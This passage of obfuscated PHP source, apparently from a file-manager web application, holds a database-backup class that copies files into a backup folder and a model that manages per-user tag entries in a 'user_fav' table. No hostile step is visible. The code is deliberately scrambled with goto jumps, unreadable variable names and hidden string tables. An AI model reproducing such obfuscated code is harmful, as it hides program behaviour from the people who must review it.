öÑĞÑŞ[$fˆğˆÇñä])) { $fˆğˆÇñä = $C öÑĞÑŞ[$fˆğˆÇñä]; } goto C§Â‰ˆÇÕ©; C§Â‰ˆÇÕ©: return $fˆğˆÇñä; goto bäª™öÉå„; bäª™öÉå„: } private function tmpFilesPath() { $DïµèÉ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $dÈ¥Å Ã‘¿ = TEMP_FILES; if ($GLOBALS[$DïµèÉ[6]][$DïµèÉ[88]][$DïµèÉ[783]]) { $dÈ¥Å Ã‘¿ = $GLOBALS[$DïµèÉ[6]][$DïµèÉ[88]][$DïµèÉ[783]]; if (!mk_dir($dÈ¥Å Ã‘¿) || !is_writable($dÈ¥Å Ã‘¿) || !IO::mkfile($dÈ¥Å Ã‘¿ . $DïµèÉ[784])) { $dÈ¥Å Ã‘¿ = TEMP_FILES; } } return $dÈ¥Å Ã‘¿; } } class BackupDbFile { public function __construct() { } public function index() { goto AóØé¹Àãã; DÙÇõ„×†: IO::copy($aæ‘ª­‘Ú´, $cÆª¸àÜëÂ); $Bß¤êï–»·->end(); $aÉªéÛãÚ = array($C¢ÃŞ£ç®[793] => $a¶Îƒ×ˆ´ˆ, $C¢ÃŞ£ç®[794] => time()); goto C˜ƒë¾ëà; dß³âåìˆ: $Bß¤êï–»· = new TaskFileTransfer($C¢ÃŞ£ç®[787], $C¢ÃŞ£ç®[763], count($a˜ôŒÜ•Ç), LNG($C¢ÃŞ£ç®[764]) . $C¢ÃŞ£ç®[454] . LNG($C¢ÃŞ£ç®[766]) . $C¢ÃŞ£ç®[788]); $Bß¤êï–»·->task[$C¢ÃŞ£ç®[744]] = $a¶Îƒ×ˆ´ˆ; foreach ($b³›ì¶ÂÜÆ[$C¢ÃŞ£ç®[74]] as $FˆÃƒáîñÂ) { $C•Éóäğ‘Â = IO::move($FˆÃƒáîñÂ[$C¢ÃŞ£ç®[76]], $cÆª¸àÜëÂ); if (!$C•Éóäğ‘Â) { $Bß¤êï–»·->end(); $FšÁ£†‚á± = IO::getLastError($C¢ÃŞ£ç®[789] . $FˆÃƒáîñÂ[$C¢ÃŞ£ç®[76]] . $C¢ÃŞ£ç®[790] . $cÆª¸àÜëÂ . $C¢ÃŞ£ç®[530]); write_log($FšÁ£†‚á±, $C¢ÃŞ£ç®[763]); return !1; } } goto C¦šÇÅ¡Ä²; C¦šÇÅ¡Ä²: $fª°ÁøàØÁ = CONTROLLER_DIR . $C¢ÃŞ£ç®[791]; $aæ‘ª­‘Ú´ = CONTROLLER_DIR . $C¢ÃŞ£ç®[792]; IO::copy($fª°ÁøàØÁ, $cÆª¸àÜëÂ); goto DÙÇõ„×†; AóØé¹Àãã: $C¢ÃŞ£ç® =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $CìÌ‰ƒÖ‚¥ = Backup::get(); $CÅ—¨Ş³—— = $CìÌ‰ƒÖ‚¥[$C¢ÃŞ£ç®[28]]; goto dÉ†®Îî×; A±«º øÜ¶: if (!$a¶Îƒ×ˆ´ˆ) { return !1; } $aÉªéÛãÚ = array($C¢ÃŞ£ç®[785] => $a¶Îƒ×ˆ´ˆ, $C¢ÃŞ£ç®[786] => time()); Backup::set($aÉªéÛãÚ); goto dß³âåìˆ; C²‹âƒ‚Æê: $b³›ì¶ÂÜÆ = IO::listPath($dòšáØÌ ); $a˜ôŒÜ•Ç = isset($b³›ì¶ÂÜÆ[$C¢ÃŞ£ç®[74]]) ? $b³›ì¶ÂÜÆ[$C¢ÃŞ£ç®[74]] : array(); $a¶Îƒ×ˆ´ˆ = array_sum(array_column($a˜ôŒÜ•Ç, $C¢ÃŞ£ç®[78])); goto A±«º øÜ¶; C˜ƒë¾ëà: Backup::set($aÉªéÛãÚ); return !0; goto EŞ°†ƒäöì; dÉ†®Îî×: $dòšáØÌ  = $this->tmpFilesPath() . "\142\141\x63\x6b\x75\x70\137{$CÅ—¨Ş³——}\57"; $cÆª¸àÜëÂ = $this->backupPath($CìÌ‰ƒÖ‚¥); if (!($cÆª¸àÜëÂ = IO::mkdir($cÆª¸àÜëÂ))) { return !1; } goto C²‹âƒ‚Æê; EŞ°†ƒäöì: } private function backupPath($AÑ´Æ›™È) { $fóèèòÂšÇ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $DìÉóôÈÁì = $AÑ´Æ›™È[$fóèèòÂšÇ[28]]; $d¿„·À º­ = Model($fóèèòÂšÇ[751])->get($fóèèòÂšÇ[752]); $BÂ’Ó’…ŸÒ = substr(md5($fóèèòÂšÇ[753] . $d¿„·À º­ . $DìÉóôÈÁì), 0, 8); return "\173\x69\157\72{$AÑ´Æ›™È[$fóèèòÂšÇ[733]]}\x7d\x2f\x64\x61\x74\x61\142\x61\163\x65\x2f\x62\x61\x63\153\x75\160\x2f" . $DìÉóôÈÁì . $fóèèòÂšÇ[71] . $BÂ’Ó’…ŸÒ; } private function tmpFilesPath() { $Bæ§˜¶ ³ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $fİº¾“…¼‰ = TEMP_FILES; if ($GLOBALS[$Bæ§˜¶ ³[6]][$Bæ§˜¶ ³[88]][$Bæ§˜¶ ³[783]]) { $fİº¾“…¼‰ = $GLOBALS[$Bæ§˜¶ ³[6]][$Bæ§˜¶ ³[88]][$Bæ§˜¶ ³[783]]; if (!mk_dir($fİº¾“…¼‰) || !is_writable($fİº¾“…¼‰) || !IO::mkfile($fİº¾“…¼‰ . $Bæ§˜¶ ³[784])) { $fİº¾“…¼‰ = TEMP_FILES; } } return $fİº¾“…¼‰; } } goto fÌİçâš£«; c­ªÈ“±§ƒ: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\x65\x72\137\146\x61\166"; protected function cacheFunctionAlias($c©«Ó¿Ï›š) { $DˆÂš¶ã‹ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; return array($DˆÂš¶ã‹[1826] => array(USER_ID, $DˆÂš¶ã‹[1827])); } protected function listData() { $E—²Ÿèôå =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $bÕÒ”ŞæŒ¢ = array($E—²Ÿèôå[1541] => USER_ID, $E—²Ÿèôå[477] => array($E—²Ÿèôå[1830], 0)); $EÎöï”Ğ¹– = $E—²Ÿèôå[1832]; $f±£“°«·Ú = $this->field($EÎöï”Ğ¹–)->where($bÕÒ”ŞæŒ¢)->order($E—²Ÿèôå[1833])->select(); return $f±£“°«·Ú ? $f±£“°«·Ú : array(); } protected function listByTag($d¢…ù­Ãîƒ) { } protected function addToTag($dõÅ¬¢‚Í, $Eâ‚–ÍŸ”Ğ) { $C‚Î„‡ğˆ“ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!Model($C‚Î„‡ğˆ“[1966])->listData($Eâ‚–ÍŸ”Ğ) || !Model($C‚Î„‡ğˆ“[813])->pathInfo($dõÅ¬¢‚Í)) { return !1; } $déŠ§ˆİàÔ = array($C‚Î„‡ğˆ“[1541] => USER_ID, $C‚Î„‡ğˆ“[477] => $Eâ‚–ÍŸ”Ğ, $C‚Î„‡ğˆ“[416] => $dõÅ¬¢‚Í, $C‚Î„‡ğˆ“[417] => $C‚Î„‡ğˆ“[411], $C‚Î„‡ğˆ“[415] => $C‚Î„‡ğˆ“[33], $C‚Î„‡ğˆ“[1723] => 0); if ($this->where($déŠ§ˆİàÔ)->find()) { return !1; } return $this->add($déŠ§ˆİàÔ); } protected function removeFromTag($EÉ³¼××ƒ, $dùÜšÚÆï») { $CÂ¦ƒÀçéô =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!Model($CÂ¦ƒÀçéô[1966])->listData($dùÜšÚÆï»)) { return !1; } if (is_array($EÉ³¼××ƒ)) { $EÉ³¼××ƒ = array($CÂ¦ƒÀçéô[7], $EÉ³¼××ƒ); } $F•Æ“¬ÁÏ = array($CÂ¦ƒÀçéô[1541] => USER_ID, $CÂ¦ƒÀçéô[477] => $dùÜšÚÆï», $CÂ¦ƒÀçéô[417] => $CÂ¦ƒÀçéô[411], $CÂ¦ƒÀçéô[416] => $EÉ³¼××ƒ); return $this->where($F•Æ“¬ÁÏ)->delete(); } protected function removeByTag($E¢„é¿”æø) { $BŠ‡ÕÅ±Ş· =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$E¢„é¿”æø) { return !1; } $Cì‘–ß”Ë = array($BŠ‡ÕÅ±Ş·[1541] => USER_ID, $BŠ‡ÕÅ±Ş·[477] => $E¢„é¿”æø); return $this->where($Cì‘–ß”Ë)->delete(); } protected function removeBySource($F»®†Ãƒ§) { $AŠ¸™†³Ğ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (is_array($F»®†Ãƒ§)) { $F»®†Ãƒ§ = array($AŠ¸™†³Ğ[7], $F»®†Ãƒ§); } $DàÏù½ƒ± = array($AŠ¸™†³Ğ[1541] => USER_ID, $AŠ¸™†³Ğ[416] => $F»®†Ãƒ§, $AŠ¸™†³Ğ[477] => array($AŠ¸™†³Ğ[994], 0)); return $this->where($DàÏù½ƒ±)->delete(); } }